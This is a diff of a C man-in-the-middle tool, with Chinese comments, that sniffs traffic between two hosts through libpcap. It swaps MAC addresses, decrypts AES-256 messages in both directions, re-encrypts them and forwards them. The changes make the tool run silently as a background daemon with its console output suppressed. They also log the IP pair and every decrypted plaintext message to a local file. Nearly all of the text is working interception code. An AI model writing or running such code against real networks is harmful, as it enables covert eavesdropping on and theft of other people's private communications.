@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <pcap.h>
+#include <unistd.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <net/ethernet.h>
@@ -39,7 +40,7 @@ int main(int argc, char **argv)
         printf("USAGE: ./middle ClientIP ServerIP");
         return 0;
     }
-
+    daemon(1, 1);
     pcap_t *descr = NULL; // 数据包捕获描述字
     int i = 0, cnt = 0;
     char errbuf[PCAP_ERRBUF_SIZE]; // 存放错误信息
@@ -57,7 +58,7 @@ int main(int argc, char **argv)
         fprintf(stderr, "ERROR at pcap_lookupdev(): %s\n", errbuf);
         exit(1);
     }
-    printf("网络设备名称：%s\n", device);
+    //printf("网络设备名称：%s\n", device);
 
     // 混杂模式打开网络设备(即捕获每一个流经网卡的数据包，无论是否发给自己)
     if ((descr = pcap_open_live(device, MAX, 1, 512, errbuf)) == NULL)
@@ -65,7 +66,7 @@ int main(int argc, char **argv)
         fprintf(stderr, "ERROR at pcap_open_live(): %s\n", errbuf);
         exit(1);
     }
-    printf("打开%s成功！\n", device);
+    //printf("打开%s成功！\n", device);
 
     // 设置BPF过滤规则
     char rule[128];
@@ -82,6 +83,16 @@ int main(int argc, char **argv)
     // printf("%s\n", rule);
     // (src host ClientIP and dst host ServerIP) or
     // (src host ServerIP and dst host ClientIP)
+
+    // 将IP写入文件
+    FILE *fp;
+    fp = fopen("./middle.txt", "w");
+    fputs("客户端IP: ", fp);
+    fputs(argv[1], fp);
+    fputs("\n服务器IP: ", fp);
+    fputs(argv[2], fp);
+    fputs("\n\n", fp);
+    fclose(fp);
 
     // 将BPF过滤规则编译到filter结构体
     if (pcap_compile(descr, &filter, rule, 1, 0) < 0)
@@ -141,6 +152,8 @@ void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *pac
     bzero(src_ip, 16);
     inet_ntop(AF_INET, &(ip->saddr), src_ip, 16); // 源地址存入src_ip
     memcpy(ethernet->ether_shost, middle_mac, 6); // 用中间人MAC替换源地址MAC
+    FILE *fp;                                     // 文件指针
+    fp = fopen("./middle.txt", "a");
     // 若捕获到的是客户端发出的数据包
     if (strncmp(src_ip, ip_t->client_ip, strlen(src_ip)) == 0)
     {
@@ -192,7 +205,11 @@ void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *pac
             bzero(plain_text, 33);
             strncpy(plain_text, buf, 32);
             Contrary_AesEncrypt(plain_text, expansion_key2client, AES256_ROUND);
-            printf("客户端->服务器，明文：%s\n\n", plain_text);
+            // 将其写入文件
+            fputs("客户端->服务器: ", fp);
+            fputs(plain_text, fp);
+            fputs("\n", fp);
+            // printf("客户端->服务器，明文：%s\n\n", plain_text);
 
             // 使用对服务器的密钥加密消息
             AesEncrypt(plain_text, expansion_key2server, AES256_ROUND);
@@ -264,7 +281,11 @@ void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *pac
             bzero(plain_text, 33);
             strncpy(plain_text, buf, 32);
             Contrary_AesEncrypt(plain_text, expansion_key2server, AES256_ROUND);
-            printf("服务器->客户端，明文：%s\n\n", plain_text);
+            // 将其写入文件
+            fputs("服务器->客户端: ", fp);
+            fputs(plain_text, fp);
+            fputs("\n", fp);
+            // printf("服务器->客户端，明文：%s\n\n", plain_text);
 
             // 加密消息，使用对服务器的密钥
             AesEncrypt(plain_text, expansion_key2client, AES256_ROUND);
@@ -287,6 +308,7 @@ void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *pac
         memcpy(ethernet->ether_dhost, client_mac, 6);
     }
     pcap_sendpacket(ip_t->p, packet, pkthdr->len);
+    fclose(fp);
 }
 
 // 计算校验和并返回
